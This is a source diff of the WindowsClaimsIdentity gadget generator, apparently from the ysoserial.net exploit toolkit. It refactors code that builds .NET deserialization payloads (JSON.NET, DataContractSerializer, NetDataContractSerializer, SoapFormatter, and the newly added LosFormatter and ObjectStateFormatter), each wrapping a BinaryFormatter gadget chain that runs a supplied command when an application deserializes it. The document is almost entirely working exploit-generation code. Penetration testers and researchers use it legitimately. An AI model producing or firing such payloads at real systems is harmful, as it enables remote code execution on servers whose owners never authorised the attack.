@@ -14,7 +14,7 @@ namespace ysoserial.Generators
     {
         public override string Description()
         {
-            return "WindowsClaimsIdentity (Microsoft.IdentityModel.Claims namespace) gadget";
+            return "WindowsClaimsIdentity gadget (requires Microsoft.IdentityModel.Claims namespace)";
 
             // This is similar to WindowsIdentityGenerator but based on Microsoft.IdentityModel.Claims.WindowsClaimsIdentity
             // "actor" has the same effect as "bootstrapContext" but is shorter. 
@@ -22,7 +22,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter"};
+            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter", "ObjectStateFormatter" };
         }
 
         public override string Name()
@@ -30,9 +30,14 @@ namespace ysoserial.Generators
             return "WindowsClaimsIdentity";
         }
 
-        public override string Credit()
+        public override string Finders()
         {
             return "Soroush Dalili";
+        }
+
+        public override List<string> Labels()
+        {
+            return new List<string> { GadgetTypes.BridgeAndDerived };
         }
 
         [Serializable]
@@ -61,39 +66,45 @@ namespace ysoserial.Generators
             }
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
+        public override object Generate(string formatter, InputArgs inputArgs)
         {
-            Generator binaryFormatterGenerator = new TypeConfuseDelegateGenerator();
-            byte[] binaryFormatterPayload = (byte[])binaryFormatterGenerator.Generate(cmd, "BinaryFormatter", false, minify);
+            Generator generator = new TextFormattingRunPropertiesGenerator();
+            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
-            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
+            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase))
             {
                 var obj = new WindowsClaimsIdentityMarshal(b64encoded);
-                return Serialize(obj, formatter, test, minify);
+                return Serialize(obj, formatter, inputArgs);
             }
             else if (formatter.ToLower().Equals("json.net"))
             {
-               
                 string payload = @"{
                     '$type': 'Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35',
                     'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                 }";
                
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = Helpers.JSONMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                    
+                    if (inputArgs.UseSimpleType)
+                    {
+                        payload = JSONMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                    }
+                    else
+                    {
+                        payload = JSONMinifier.Minify(payload, null, null);
+                    }
                 }
 
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
-                        Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
-                        {
-                            TypeNameHandling = TypeNameHandling.Auto
-                        });
+                        SerializersHelper.JsonNet_deserialize(payload);
                     }
                     catch
                     {
@@ -111,20 +122,23 @@ namespace ysoserial.Generators
 </root>
 ";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                    if (inputArgs.UseSimpleType)
+                    {
+                        payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                    }
+                    else
+                    {
+                        payload = XMLMinifier.Minify(payload, null, null);
+                    }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
-                        var xmlDoc = new XmlDocument();
-                        xmlDoc.LoadXml(payload);
-                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
-                        var s = new DataContractSerializer(Type.GetType(xmlItem.GetAttribute("type")));
-                        var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root");
                     }
                     catch
                     {
@@ -148,20 +162,23 @@ namespace ysoserial.Generators
 </root>
 ";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                    if (inputArgs.UseSimpleType)
+                    {
+                        payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                    }
+                    else
+                    {
+                        payload = XMLMinifier.Minify(payload, null, null);
+                    }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
-                        var xmlDoc = new XmlDocument();
-                        xmlDoc.LoadXml(payload);
-                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
-                        var s = new NetDataContractSerializer();
-                        var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+                        SerializersHelper.NetDataContractSerializer_deserialize(payload, "root");
                     }
                     catch
                     {
@@ -181,19 +198,23 @@ namespace ysoserial.Generators
 </SOAP-ENV:Envelope>
 ";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null, Helpers.FormatterType.SoapFormatter);
+                    if (inputArgs.UseSimpleType)
+                    {
+                        payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null, FormatterType.SoapFormatter);
+                    }
+                    else
+                    {
+                        payload = XMLMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
+                    }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
-                        byte[] byteArray = System.Text.Encoding.ASCII.GetBytes(payload);
-                        MemoryStream ms = new MemoryStream(byteArray);
-                        SoapFormatter sf = new SoapFormatter();
-                        sf.Deserialize(ms);
+                        SerializersHelper.SoapFormatter_deserialize(payload);
                     }
                     catch
                     {
